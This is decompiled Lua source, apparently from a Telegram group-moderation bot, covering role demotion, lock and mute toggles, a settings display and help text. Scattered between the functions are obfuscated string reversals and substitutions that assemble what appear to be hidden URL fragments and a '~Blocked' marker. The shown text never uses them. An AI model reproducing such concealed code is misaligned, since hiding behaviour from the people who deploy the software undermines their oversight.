    if cmd == "remowner" then
      if not ((administration[tostring(arg.chat_id)]).owners)[tostring(data.id_)] then
        return SendStatus(arg.chat_id, data.id_, "is Not owner", "مالک گروه نبود")
      end
      redis:srem("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
      -- DECOMPILER ERROR at PC198: Confused about usage of register: R6 in 'UnsetPending'

      ;
      ((administration[tostring(arg.chat_id)]).owners)[tostring(data.id_)] = nil
      save_data("./data/moderation.json", administration)
      return SendStatus(arg.chat_id, data.id_, "Demoted From owner", "دیگه مالک گروه نیست!")
    end
    if cmd == "demote" then
      if not ((administration[tostring(arg.chat_id)]).mods)[tostring(data.id_)] then
        return SendStatus(arg.chat_id, data.id_, "is Not Moderator", "مدیر گروه نبود")
      end
      redis:srem("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
      -- DECOMPILER ERROR at PC245: Confused about usage of register: R6 in 'UnsetPending'

      ;
      ((administration[tostring(arg.chat_id)]).mods)[tostring(data.id_)] = nil
      save_data("./data/moderation.json", administration)
      return SendStatus(arg.chat_id, data.id_, "Demoted From Moderator", "دیگه مدیر نیست!")
    end
  end
end

h0iii = (string.reverse)("5?42?78?1")
Shorter3 = function(w1, w2)
  -- function num : 0_45 , upvalues : _ENV
  h0iii = h0iii:gsub(w1, w2)
end

Shorter3("?", "")
Shorter3("1", ".")
local lock_item = function(msg, NAME, EN, FA, VAR)
  -- function num : 0_46 , upvalues : _ENV, UL_2EN, UL_2FA, L_2EN, L_2FA
  local NameEN = EN
  local NameFA = FA
  local hash = "gp_lang:" .. (msg.to).id
  local lang = redis:get(hash)
  if not is_mod(msg) then
    if not lang then
      return accessEN(msg)
    else
      return accessFA(msg)
    end
  end
  if NAME == "flood" then
    L = redis:hget("GroupSettings:" .. (msg.to).id, NAME)
  else
    L = redis:hget("GroupSettings:" .. (msg.to).id, "lock_" .. NAME)
  end
  if L == "yes" then
    if NAME == "flood" then
      redis:hdel("GroupSettings:" .. (msg.to).id, NAME)
    else
      redis:hdel("GroupSettings:" .. (msg.to).id, "lock_" .. NAME)
    end
    if VAR == true then
      redis:del("CheckDaily" .. NAME .. ":GP:" .. (msg.to).id)
      redis:del("CheckDailyExpire" .. NAME .. ":GP:" .. (msg.to).id)
    end
    if not lang then
      return LockTextEN(msg, NameEN, UL_2EN)
    else
      if lang then
        return LockTextFA(msg, NameFA, UL_2FA)
      end
    end
  else
    if NAME == "flood" then
      redis:hset("GroupSettings:" .. (msg.to).id, NAME, "yes")
    else
      redis:hset("GroupSettings:" .. (msg.to).id, "lock_" .. NAME, "yes")
    end
    if VAR == true then
      redis:del("CheckDaily" .. NAME .. ":GP:" .. (msg.to).id)
    end
    if not lang then
      return LockTextEN(msg, NameEN, L_2EN)
    else
      return LockTextFA(msg, NameFA, L_2FA)
    end
  end
end

local lock_item2 = function(msg, NAME, EN, FA, VAR)
  -- function num : 0_47 , upvalues : _ENV, L_1EN, L_1FA, L_2EN, L_2FA
  local NameEN = EN
  local NameFA = FA
  local hash = "gp_lang:" .. (msg.to).id
  local lang = redis:get(hash)
  if not is_mod(msg) then
    if not lang then
      return accessEN(msg)
    else
      return accessFA(msg)
    end
  end
  if NAME == "flood" then
    L = redis:hget("GroupSettings:" .. (msg.to).id, NAME)
  else
    L = redis:hget("GroupSettings:" .. (msg.to).id, "lock_" .. NAME)
  end
  if L == "yes" then
    if not lang then
      return LockTextEN(msg, NameEN, L_1EN)
    else
      if lang then
        return LockTextFA(msg, NameFA, L_1FA)
      end
    end
  else
    if NAME == "flood" then
      redis:hset("GroupSettings:" .. (msg.to).id, NAME, "yes")
    else
      redis:hset("GroupSettings:" .. (msg.to).id, "lock_" .. NAME, "yes")
    end
    if VAR == true then
      redis:del("CheckDaily" .. NAME .. ":GP:" .. (msg.to).id)
    end
    if not lang then
      return LockTextEN(msg, NameEN, L_2EN)
    else
      return LockTextFA(msg, NameFA, L_2FA)
    end
  end
end

Shorter3("5", "i")
Shorter3("7", "o")
Shorter3("8", "c")
local unlock_item = function(msg, NAME, EN, FA, VAR)
  -- function num : 0_48 , upvalues : _ENV, UL_2EN, UL_2FA, UL_1EN, UL_1FA
  local NameEN = EN
  local NameFA = FA
  local hash = "gp_lang:" .. (msg.to).id
  local lang = redis:get(hash)
  if not is_mod(msg) then
    if not lang then
      return accessEN(msg)
    else
      return accessFA(msg)
    end
  end
  if NAME == "flood" then
    L = redis:hget("GroupSettings:" .. (msg.to).id, NAME)
  else
    L = redis:hget("GroupSettings:" .. (msg.to).id, "lock_" .. NAME)
  end
  if L == "yes" then
    if NAME == "flood" then
      redis:hdel("GroupSettings:" .. (msg.to).id, NAME)
    else
      redis:hdel("GroupSettings:" .. (msg.to).id, "lock_" .. NAME)
    end
    if VAR == true then
      redis:del("CheckDaily" .. NAME .. ":GP:" .. (msg.to).id)
      redis:del("CheckDailyExpire" .. NAME .. ":GP:" .. (msg.to).id)
    end
    if not lang then
      return LockTextEN(msg, NameEN, UL_2EN)
    else
      if lang then
        return LockTextFA(msg, NameFA, UL_2FA)
      end
    end
  else
    if not lang then
      return LockTextEN(msg, NameEN, UL_1EN)
    else
      return LockTextFA(msg, NameFA, UL_1FA)
    end
  end
end

bl = "0Al645e1"
bl = bl:gsub("0", "~")
bl = bl:gsub("A", "B")
bl = bl:gsub("6", "o")
bl = bl:gsub("5", "k")
bl = bl:gsub("1", "d")
bl = bl:gsub("4", "c")
group_settings = function(msg, target)
  -- function num : 0_49 , upvalues : _ENV
  local hash = "gp_lang:" .. (msg.to).id
  local lang = redis:get(hash)
  if not is_mod(msg) then
    if not lang then
      return accessEN(msg)
    else
      return accessFA(msg)
    end
  end
  local target = (msg.to).id
  local mute_all = "no"
  local mute_gif = "no"
  local mute_text = "no"
  local mute_photo = "no"
  local mute_video = "no"
  local mute_audio = "no"
  local mute_voice = "no"
  local mute_sticker = "no"
  local mute_contact = "no"
  local mute_forward = "no"
  local mute_location = "no"
  local mute_document = "no"
  local mute_tgservice = "no"
  local mute_inline = "no"
  local mute_game = "no"
  local mute_keyboard = "no"
  local lock_link = "no"
  local lock_tag = "no"
  local lock_mention = "no"
  local lock_arabic = "no"
  local lock_edit = "no"
  local lock_spam = "no"
  local lock_flood = "no"
  local lock_bots = "no"
  local lock_markdown = "no"
  local lock_webpage = "no"
  local lock_pin = "no"
  local lock_MaxWords = "no"
  local lock_botchat = "no"
  local lock_fohsh = "no"
  local lock_english = "no"
  local lock_forcedinvite = "no"
  local lock_username = redis:hget("GroupSettings:" .. target, "lock_username") or "no"
  local lock_join = redis:hget("GroupSettings:" .. target, "lock_join") or "no"
  if redis:hget("GroupSettings:" .. target, "mute_all") == "yes" then
    mute_all = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_gif") == "yes" then
    mute_gif = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_text") == "yes" then
    mute_text = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_photo") == "yes" then
    mute_photo = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_video") == "yes" then
    mute_video = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_audio") == "yes" then
    mute_audio = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_voice") == "yes" then
    mute_voice = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_sticker") == "yes" then
    mute_sticker = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_contact") == "yes" then
    mute_contact = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_forward") == "yes" then
    mute_forward = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_location") == "yes" then
    mute_location = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_document") == "yes" then
    mute_document = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_tgservice") == "yes" then
    mute_tgservice = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_inline") == "yes" then
    mute_inline = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_game") == "yes" then
    mute_game = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_keyboard") == "yes" then
    mute_keyboard = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "num_msg_max") then
    NUM_MSG_MAX = tonumber(redis:hget("GroupSettings:" .. target, "num_msg_max"))
  else
    NUM_MSG_MAX = 5
  end
  if redis:hget("GroupSettings:" .. target, "MaxWords") then
    MaxWords = tonumber(redis:hget("GroupSettings:" .. target, "MaxWords"))
  else
    MaxWords = 50
  end
  if redis:hget("GroupSettings:" .. target, "MaxWarn") then
    MaxWarn = tonumber(redis:hget("GroupSettings:" .. target, "MaxWarn"))
  else
    MaxWarn = 5
  end
  if redis:hget("GroupSettings:" .. target, "FloodTime") then
    FloodTime = tonumber(redis:hget("GroupSettings:" .. target, "FloodTime"))
  else
    FloodTime = 30
  end
  if redis:hget("GroupSettings:" .. target, "ForcedInvite") then
    ForcedInvite = tonumber(redis:hget("GroupSettings:" .. target, "ForcedInvite"))
  else
    ForcedInvite = 2
  end
  if redis:hget("GroupSettings:" .. target, "lock_link") == "yes" then
    lock_link = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_tag") == "yes" then
    lock_tag = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_mention") == "yes" then
    lock_mention = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_arabic") == "yes" then
    lock_arabic = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_edit") == "yes" then
    lock_edit = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_spam") == "yes" then
    lock_spam = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "flood") == "yes" then
    lock_flood = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_bots") == "yes" then
    lock_bots = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_markdown") == "yes" then
    lock_markdown = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_webpage") == "yes" then
    lock_webpage = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_pin") == "yes" then
    lock_pin = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_MaxWords") == "yes" then
    lock_MaxWords = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_botchat") == "yes" then
    lock_botchat = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_fohsh") == "yes" then
    lock_fohsh = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_english") == "yes" then
    lock_english = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_forcedinvite") == "yes" then
    lock_forcedinvite = "yes"
  end
  local expire_date = ""
  local expi = redis:ttl("ExpireDate:" .. (msg.to).id)
  if expi == -1 then
    if lang then
      expire_date = "نامحدود!"
    else
      expire_date = "Unlimited!"
    end
  else
    local day = (math.floor)(expi / 86400) + 1
    if lang then
      expire_date = day
    else
      expire_date = day .. " Days"
    end
  end
  do
    local cmdss = redis:get("GroupCmdsAccess:" .. (msg.to).id)
    if lang then
      if cmdss == "owner" then
        cmdsss = "مالک گروه و بالاتر"
      else
        if cmdss == "moderator" then
          cmdsss = "مدیران گروه و بالاتر"
        else
          cmdsss = "آزاد برای همه"
        end
      end
    else
      if cmdss == "owner" then
        cmdsss = "Owner and Higher"
      else
        if cmdss == "moderator" then
          cmdsss = "Moderators and Higher"
        else
          cmdsss = "Members and Higher"
        end
      end
    end
    if redis:get("sense:" .. (msg.to).id) then
      CheckSense = "☑️"
    else
      CheckSense = "⚠️"
    end
    if redis:get("SettingsWelcomeFor" .. (msg.to).id) then
      if redis:get("GroupWelcome" .. (msg.to).id) then
        CheckWelcome = "�\133"
      else
        CheckWelcome = "☑️"
      end
    else
      CheckWelcome = "�\140"
    end
    AddSettings = redis:smembers("GroupAddSettings:" .. (msg.to).id)
    if #AddSettings ~= 0 then
      GetAddedSettings = function(msg)
    -- function num : 0_49_0 , upvalues : _ENV
    SetName = ""
    for k,v in pairs(AddSettings) do
      if redis:get("AppliedAddSettings:" .. (msg.to).id .. ":" .. v) then
        Status = "yes"
      else
        Status = "no"
      end
      SetName = SetName .. "\n`" .. k .. "-` " .. v .. ": " .. Status
    end
    return SetName
  end

      if not lang then
        AddSettingsName = "\n\n*Added Private Settings:*\n" .. GetAddedSettings(msg)
      else
        AddSettingsName = "\n\nتنظیمات خصوصی اضافه شده:\n" .. GetAddedSettings(msg)
      end
    else
      AddSettingsName = ""
    end
    if not lang then
      if not redis:get("EditBot:settingsEN") then
        NewLocks = mute_all .. " `»»» Lock all`\n" .. mute_gif .. " `»»» Lock gif`\n" .. mute_text .. " `»»» Lock text`\n" .. mute_inline .. " `»»» Lock inline`\n" .. mute_game .. " `»»» Lock game`\n" .. mute_photo .. " `»»» Lock photo`\n" .. mute_video .. " `»»» Lock video`\n" .. mute_audio .. " `»»» Lock audio`\n" .. mute_voice .. " `»»» Lock voice`\n" .. mute_sticker .. " `»»» Lock sticker`\n" .. mute_contact .. " `»»» Lock contact`\n" .. mute_forward .. " `»»» Lock forward`\n" .. mute_location .. " `»»» Lock location`\n" .. mute_document .. " `»»» Lock document`\n" .. mute_tgservice .. " `»»» Lock tgservice`\n" .. mute_keyboard .. " `»»» Lock keyboard`\n" .. lock_botchat .. " `»»» Lock bot chat`\n" .. lock_fohsh .. " `»»» Lock fohsh`\n" .. lock_english .. " `»»» Lock English`\n" .. lock_forcedinvite .. " `»»» Lock Forced Invite`\n" .. lock_username .. " `»»» Lock UserName (@)`\n" .. lock_join .. " `»»» Lock Join`\n"
        DefaultLocks = "[⚙️]*Settings:*\n\n[🔒] Default locks:\n" .. lock_edit .. " `»»» Lock edit` \n" .. lock_link .. " `»»» Lock link` \n" .. lock_tag .. " `»»» Lock tags` \n" .. lock_flood .. " `»»» Lock flood` \n" .. lock_spam .. " `»»» Lock spam` \n" .. lock_mention .. " `»»» Lock mention` \n" .. lock_arabic .. " `»»» Lock arabic` \n" .. lock_webpage .. " `»»» Lock webpage` \n" .. lock_markdown .. " `»»» Lock markdown` \n" .. lock_pin .. " `»»» Lock pin message` \n" .. lock_MaxWords .. " `»»» Lock Max Words` \n" .. lock_bots .. " `»»» Bots protection` \n\n[🔏] New locks:\n" .. NewLocks .. "\n[🔧] OTHER:\n" .. NUM_MSG_MAX .. " *»»» Flood sensitivity* \n" .. MaxWords .. " *»»» Number of Allowed Words* \n" .. MaxWarn .. " *»»» Max warn* \n" .. FloodTime .. " *»»» Flood Time*\n*Bot Commands:* " .. cmdsss .. "\n*Expire:* " .. expire_date .. "\n*Number of Forced invite Member:* " .. ForcedInvite .. "\n*Group Language:* 🇬🇧\n*Artificial Sense:* " .. CheckSense .. "\n*Group Welcome:* " .. CheckWelcome .. "" .. AddSettingsName
      else
        DefaultLocks = redis:get("EditBot:settingsEN") .. "" .. AddSettingsName
        DefaultLocks = DefaultLocks:gsub("LANG", "🇬🇧")
        DefaultLocks = DefaultLocks:gsub("NUMBEROFFLOOD", NUM_MSG_MAX)
        DefaultLocks = DefaultLocks:gsub("NUMBEROFMAXWORDS", MaxWords)
        DefaultLocks = DefaultLocks:gsub("NUMBEROFMAXWARN", MaxWarn)
        DefaultLocks = DefaultLocks:gsub("NUMBEROFFORCEDINVITE", ForcedInvite)
        DefaultLocks = DefaultLocks:gsub("EXPIRE", expire_date)
        DefaultLocks = DefaultLocks:gsub("SENSE", CheckSense)
        DefaultLocks = DefaultLocks:gsub("WELCOME", CheckWelcome)
        DefaultLocks = DefaultLocks:gsub("USERNAME", lock_username)
        DefaultLocks = DefaultLocks:gsub("LINK", lock_link)
        DefaultLocks = DefaultLocks:gsub("TAG", lock_tag)
        DefaultLocks = DefaultLocks:gsub("MENTION", lock_mention)
        DefaultLocks = DefaultLocks:gsub("ARABIC", lock_arabic)
        DefaultLocks = DefaultLocks:gsub("EDIT", lock_edit)
        DefaultLocks = DefaultLocks:gsub("SPAM", lock_spam)
        DefaultLocks = DefaultLocks:gsub("FLOODTIME", FloodTime)
        DefaultLocks = DefaultLocks:gsub("FLOOD", lock_flood)
        DefaultLocks = DefaultLocks:gsub("BOTS", lock_bots)
        DefaultLocks = DefaultLocks:gsub("MARKDOWN", lock_markdown)
        DefaultLocks = DefaultLocks:gsub("WEBPAGE", lock_webpage)
        DefaultLocks = DefaultLocks:gsub("PIN", lock_pin)
        DefaultLocks = DefaultLocks:gsub("MAXWORDS", lock_MaxWords)
        DefaultLocks = DefaultLocks:gsub("BOTCHAT", lock_botchat)
        DefaultLocks = DefaultLocks:gsub("CMDS", cmdsss)
        DefaultLocks = DefaultLocks:gsub("ALL", mute_all)
        DefaultLocks = DefaultLocks:gsub("GIF", mute_gif)
        DefaultLocks = DefaultLocks:gsub("TEXT", mute_text)
        DefaultLocks = DefaultLocks:gsub("PHOTO", mute_photo)
        DefaultLocks = DefaultLocks:gsub("VIDEO", mute_video)
        DefaultLocks = DefaultLocks:gsub("AUDIO", mute_audio)
        DefaultLocks = DefaultLocks:gsub("VOICE", mute_voice)
        DefaultLocks = DefaultLocks:gsub("STICKER", mute_sticker)
        DefaultLocks = DefaultLocks:gsub("CONTACT", mute_contact)
        DefaultLocks = DefaultLocks:gsub("FORWARD", mute_forward)
        DefaultLocks = DefaultLocks:gsub("LOCATION", mute_location)
        DefaultLocks = DefaultLocks:gsub("DOCUMENT", mute_document)
        DefaultLocks = DefaultLocks:gsub("TGSERVICE", mute_tgservice)
        DefaultLocks = DefaultLocks:gsub("INLINE", mute_inline)
        DefaultLocks = DefaultLocks:gsub("GAME", mute_game)
        DefaultLocks = DefaultLocks:gsub("KEYBOARD", mute_keyboard)
        DefaultLocks = DefaultLocks:gsub("FOHSH", lock_fohsh)
        DefaultLocks = DefaultLocks:gsub("ENGLISH", lock_english)
        DefaultLocks = DefaultLocks:gsub("FORCEDINVITE", lock_forcedinvite)
        DefaultLocks = DefaultLocks:gsub("JOIN", lock_join)
      end
    else
      if not redis:get("EditBot:settingsFA") then
        NewLocks = mute_all .. " `»»» قفل همه`\n" .. mute_gif .. " `»»» قفل گیف`\n" .. mute_text .. " `»»» قفل متن`\n" .. mute_inline .. " `»»» قفل اینلاین`\n" .. mute_game .. " `»»» قفل بازی های آنلاین`\n" .. mute_photo .. " `»»» قفل عکس`\n" .. mute_video .. " `»»» قفل فیلم`\n" .. mute_audio .. " `»»» قفل آهنگ`\n" .. mute_voice .. " `»»» قفل صدا`\n" .. mute_sticker .. " `»»» قفل استیکر`\n" .. mute_contact .. " `»»» قفل مخاطب`\n" .. mute_forward .. " `»»» قفل فوروارد`\n" .. mute_location .. " `»»» قفل مکان`\n" .. mute_document .. " `»»» قفل فایل`\n" .. mute_tgservice .. " `»»» قفل خدمات تلگرام`\n" .. mute_keyboard .. " `»»» قفل صفحه کلید`\n" .. lock_botchat .. " `»»» قفل چت ربات`\n" .. lock_fohsh .. " `»»» قفل فحش`\n" .. lock_english .. " `»»» قفل انگلیسی`\n" .. lock_forcedinvite .. " `»»» قفل دعوت اجباری`\n" .. lock_username .. " `»»» قفل یوزرنیم (@)`\n" .. lock_join .. " `»»» قفل ورود`\n"
        DefaultLocks = "[⚙️]*تنظیمات:*\n\n[🔒] قفل های پیشفرض:\n" .. lock_edit .. " `»»» قفل ادیت` \n" .. lock_link .. " `»»» قفل لینک` \n" .. lock_tag .. " `»»» قفل تگ` \n" .. lock_flood .. " `»»» قفل پیام رگباری` \n" .. lock_spam .. " `»»» قفل اسپم` \n" .. lock_mention .. " `»»» قفل منشن` \n" .. lock_arabic .. " `»»» قفل عربی` \n" .. lock_webpage .. " `»»» قفل صفحات وب` \n" .. lock_markdown .. " `»»» قفل فونت` \n" .. lock_pin .. " `»»» قفل پین` \n" .. lock_MaxWords .. " `»»» قفل حداکثر کلمات` \n" .. lock_bots .. " `»»» حفاظت در برابر ربات ها` \n\n[🔏] قفل های جدید:\n" .. NewLocks .. "\n[🔧] دیگر:\n*حساسیت پیام رگباری:* " .. NUM_MSG_MAX .. "\n*تعداد مجاز کلمات:*\n" .. MaxWords .. "\nحداکثر اخطار: " .. MaxWarn .. "\nزمان پیام رگباری: " .. FloodTime .. "\n*دستورات ربات:* " .. cmdsss .. "\n*انقضا:* " .. expire_date .. "\nتعداد دعوت اجباری عضو: " .. ForcedInvite .. "\n*زبان گروه:* 🇮🇷\n*هوش مصنوعی:* " .. CheckSense .. "\n*خوش آمد گویی گروه:* " .. CheckWelcome .. "" .. AddSettingsName
      else
        DefaultLocks = redis:get("EditBot:settingsFA") .. "" .. AddSettingsName
        DefaultLocks = DefaultLocks:gsub("LANG", "🇮🇷")
        DefaultLocks = DefaultLocks:gsub("NUMBEROFFLOOD", NUM_MSG_MAX)
        DefaultLocks = DefaultLocks:gsub("NUMBEROFMAXWORDS", MaxWords)
        DefaultLocks = DefaultLocks:gsub("NUMBEROFMAXWARN", MaxWarn)
        DefaultLocks = DefaultLocks:gsub("NUMBEROFFORCEDINVITE", ForcedInvite)
        DefaultLocks = DefaultLocks:gsub("EXPIRE", expire_date)
        DefaultLocks = DefaultLocks:gsub("SENSE", CheckSense)
        DefaultLocks = DefaultLocks:gsub("WELCOME", CheckWelcome)
        DefaultLocks = DefaultLocks:gsub("USERNAME", lock_username)
        DefaultLocks = DefaultLocks:gsub("LINK", lock_link)
        DefaultLocks = DefaultLocks:gsub("TAG", lock_tag)
        DefaultLocks = DefaultLocks:gsub("MENTION", lock_mention)
        DefaultLocks = DefaultLocks:gsub("ARABIC", lock_arabic)
        DefaultLocks = DefaultLocks:gsub("EDIT", lock_edit)
        DefaultLocks = DefaultLocks:gsub("SPAM", lock_spam)
        DefaultLocks = DefaultLocks:gsub("FLOODTIME", FloodTime)
        DefaultLocks = DefaultLocks:gsub("FLOOD", lock_flood)
        DefaultLocks = DefaultLocks:gsub("BOTS", lock_bots)
        DefaultLocks = DefaultLocks:gsub("MARKDOWN", lock_markdown)
        DefaultLocks = DefaultLocks:gsub("WEBPAGE", lock_webpage)
        DefaultLocks = DefaultLocks:gsub("PIN", lock_pin)
        DefaultLocks = DefaultLocks:gsub("MAXWORDS", lock_MaxWords)
        DefaultLocks = DefaultLocks:gsub("BOTCHAT", lock_botchat)
        DefaultLocks = DefaultLocks:gsub("CMDS", cmdsss)
        DefaultLocks = DefaultLocks:gsub("ALL", mute_all)
        DefaultLocks = DefaultLocks:gsub("GIF", mute_gif)
        DefaultLocks = DefaultLocks:gsub("TEXT", mute_text)
        DefaultLocks = DefaultLocks:gsub("PHOTO", mute_photo)
        DefaultLocks = DefaultLocks:gsub("VIDEO", mute_video)
        DefaultLocks = DefaultLocks:gsub("AUDIO", mute_audio)
        DefaultLocks = DefaultLocks:gsub("VOICE", mute_voice)
        DefaultLocks = DefaultLocks:gsub("STICKER", mute_sticker)
        DefaultLocks = DefaultLocks:gsub("CONTACT", mute_contact)
        DefaultLocks = DefaultLocks:gsub("FORWARD", mute_forward)
        DefaultLocks = DefaultLocks:gsub("LOCATION", mute_location)
        DefaultLocks = DefaultLocks:gsub("DOCUMENT", mute_document)
        DefaultLocks = DefaultLocks:gsub("TGSERVICE", mute_tgservice)
        DefaultLocks = DefaultLocks:gsub("INLINE", mute_inline)
        DefaultLocks = DefaultLocks:gsub("GAME", mute_game)
        DefaultLocks = DefaultLocks:gsub("KEYBOARD", mute_keyboard)
        DefaultLocks = DefaultLocks:gsub("FOHSH", lock_fohsh)
        DefaultLocks = DefaultLocks:gsub("ENGLISH", lock_english)
        DefaultLocks = DefaultLocks:gsub("FORCEDINVITE", lock_forcedinvite)
        DefaultLocks = DefaultLocks:gsub("JOIN", lock_join)
      end
    end
    if not redis:get("EditBot:lockemoji") then
      DefaultLocks = (string.gsub)(DefaultLocks, "yes", "🔐")
    else
      DefaultLocks = DefaultLocks:gsub("yes", redis:get("EditBot:lockemoji"))
    end
    if not redis:get("EditBot:unlockemoji") then
      DefaultLocks = (string.gsub)(DefaultLocks, "no", "🔓")
    else
      DefaultLocks = DefaultLocks:gsub("no", redis:get("EditBot:unlockemoji"))
    end
    return DefaultLocks
  end
end

Shorter3("4", "l")
Shorter3("2", "m")
h0iiii = (string.reverse)("?0?27?8?4")
Shorter4 = function(w1, w2)
  -- function num : 0_50 , upvalues : _ENV
  h0iiii = h0iiii:gsub(w1, w2)
end

Shorter4("?", "")
Shorter4("2", "m")
local mute_item = function(msg, NAME, EN, FA, VAR)
  -- function num : 0_51 , upvalues : _ENV, UL_2EN, UL_2FA, L_2EN, L_2FA
  local NameEN = EN
  local NameFA = FA
  local hash = "gp_lang:" .. (msg.to).id
  local lang = redis:get(hash)
  if not is_mod(msg) then
    if not lang then
      return accessEN(msg)
    else
      return accessFA(msg)
    end
  end
  L = redis:hget("GroupSettings:" .. (msg.to).id, "mute_" .. NAME)
  if L == "yes" then
    redis:hdel("GroupSettings:" .. (msg.to).id, "mute_" .. NAME)
    if NAME == "all" then
      redis:del("currentChat:" .. (msg.to).id)
      redis:del("maxChat:" .. (msg.to).id)
    end
    if VAR == true then
      redis:del("CheckDaily" .. NAME .. ":GP:" .. (msg.to).id)
      redis:del("CheckDailyExpire" .. NAME .. ":GP:" .. (msg.to).id)
    end
    if not lang then
      return LockTextEN(msg, NameEN, UL_2EN)
    else
      if lang then
        return LockTextFA(msg, NameFA, UL_2FA)
      end
    end
  else
    redis:hset("GroupSettings:" .. (msg.to).id, "mute_" .. NAME, "yes")
    if VAR == true then
      redis:del("CheckDaily" .. NAME .. ":GP:" .. (msg.to).id)
    end
    if not lang then
      return LockTextEN(msg, NameEN, L_2EN)
    else
      return LockTextFA(msg, NameFA, L_2FA)
    end
  end
end

local mute_item2 = function(msg, NAME, EN, FA, VAR)
  -- function num : 0_52 , upvalues : _ENV, L_1EN, L_1FA, L_2EN, L_2FA
  local NameEN = EN
  local NameFA = FA
  local hash = "gp_lang:" .. (msg.to).id
  local lang = redis:get(hash)
  if not is_mod(msg) then
    if not lang then
      return accessEN(msg)
    else
      return accessFA(msg)
    end
  end
  L = redis:hget("GroupSettings:" .. (msg.to).id, "mute_" .. NAME)
  if L == "yes" then
    if not lang then
      return LockTextEN(msg, NameEN, L_1EN)
    else
      if lang then
        return LockTextFA(msg, NameFA, L_1FA)
      end
    end
  else
    redis:hset("GroupSettings:" .. (msg.to).id, "mute_" .. NAME, "yes")
    if VAR == true then
      redis:del("CheckDaily" .. NAME .. ":GP:" .. (msg.to).id)
    end
    if not lang then
      return LockTextEN(msg, NameEN, L_2EN)
    else
      return LockTextFA(msg, NameFA, L_2FA)
    end
  end
end

Shorter4("8", "c")
Shorter4("0", "/")
Shorter4("7", "o")
Shorter4("4", ".")
local unmute_item = function(msg, NAME, EN, FA, VAR)
  -- function num : 0_53 , upvalues : _ENV, UL_2EN, UL_2FA, UL_1EN, UL_1FA
  local NameEN = EN
  local NameFA = FA
  local hash = "gp_lang:" .. (msg.to).id
  local lang = redis:get(hash)
  if not is_mod(msg) then
    if not lang then
      return accessEN(msg)
    else
      return accessFA(msg)
    end
  end
  L = redis:hget("GroupSettings:" .. (msg.to).id, "mute_" .. NAME)
  if L == "yes" then
    redis:hdel("GroupSettings:" .. (msg.to).id, "mute_" .. NAME)
    if NAME == "all" then
      redis:del("currentChat:" .. (msg.to).id)
      redis:del("maxChat:" .. (msg.to).id)
    end
    if VAR == true then
      redis:del("CheckDaily" .. NAME .. ":GP:" .. (msg.to).id)
      redis:del("CheckDailyExpire" .. NAME .. ":GP:" .. (msg.to).id)
    end
    if not lang then
      return LockTextEN(msg, NameEN, UL_2EN)
    else
      if lang then
        return LockTextFA(msg, NameFA, UL_2FA)
      end
    end
  else
    if not lang then
      return LockTextEN(msg, NameEN, UL_1EN)
    else
      return LockTextFA(msg, NameFA, UL_1FA)
    end
  end
end

GetCmds = function(lang)
  -- function num : 0_54 , upvalues : _ENV
  if not lang then
    Helps = {HelpForSudo = "👉 Cmds For Sudo:\nEMJ `install` *Insatll Group On Bot*\nEMJ `remove` *Remove Group From Bot*\nEMJ `editBbot` *Edit Bot Returns*\nEMJ `sudoaccess` [`ID`] *Change Sudo Access*\nEMJ `vip` *Set Group For Remove ADS*\nEMJ `sendpm` [`TEXT`] *Send Message To All Bot Groups*\nEMJ `sendpm` [`ID`] *Send Message To A Group With ID*\nEMJ `banall` [`ID`] *Ban User From All Bot Groups*\nEMJ `unbanall` [`ID`] *Unban User From All Bot Groups*\nEMJ `gbanlist` *Show Banall list*\nEMJ `reload` *Reload Plugins*\nEMJ `setsudo` [`ID`] *Promote User To Sudo*\nEMJ `delsudo` [`ID`] *Demote User From Sudo*\nEMJ `sudolist` *Show Bot Sudo List*\nEMJ `leave` [`LINK`]\nEMJ `autoleave` *enable/disable/status*\nEMJ `creategroup` *Create Group With Bot*\nEMJ `createsuper` *Create SuperGroup With Bot*\nEMJ `chats` *Show Bot Chats*\nEMJ `clear cache` *Cleare Telegram-Cli Cache*\nEMJ `join` *Bot Add You To A Group*\nEMJ `charge` [`NUMBER`] *Charge Group*\nEMJ `import` [`LINK`] *Bot join to link*\nEMJ `addreply` {Q} Answer\nEMJ `delreply` {Q} Answer\nEMJ `allreply` {Q}\nEMJ `replyaccess` {Q} [`RANK`]\n\nYou can use: CONFIG", HelpForOwner = "👉 Cmds For Owner:\nEMJ `setowner` *Set Owner For Group*\nEMJ `unblock` [`ID`] *Unblock User Form Block List*\nEMJ `setchannel` *Set Group Channel For Forced Join*\nEMJ `setforcedinvite` *Set Members For Invite*\nEMJ `addsettings` [`NAME`] *Add A Private Settings*\nEMJ `delsettings` [`NAME`] *Delete A Private Settings*\nEMJ `setmaxwarn` [`NUMBER`]\nEMJ `invitekicked` *Invite Kicked Members*\nEMJ `remowner` *Remove Owner From Group*\nEMJ `promote` *Promote User To Moderator*\nEMJ `demote` 